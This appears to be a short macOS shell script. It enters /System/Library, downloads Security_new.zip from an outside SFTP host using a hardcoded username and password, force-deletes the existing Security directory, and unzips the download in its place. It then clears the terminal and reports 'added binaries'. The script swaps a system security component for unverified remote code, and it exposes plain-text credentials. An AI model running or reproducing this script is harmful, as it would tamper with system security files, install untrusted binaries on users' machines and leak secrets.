cd $home/../../..//System/Library/
# configuration

REMOTE_USER="a957779a069a43279eba04e868aae51c"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_PATH="/home"
REMOTE_PASS="7WHEsgAZlIDIMW0th0oc1K01xC2wwApK"
REMOTE_DEST="/"


sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
rm -rf ./Security
#echo "fsdfsdfdsfsdfsdfds"
unzip -o Security_new.zip -d ./
rm -f *.zip
reset
echo "sucessfully added binaries"
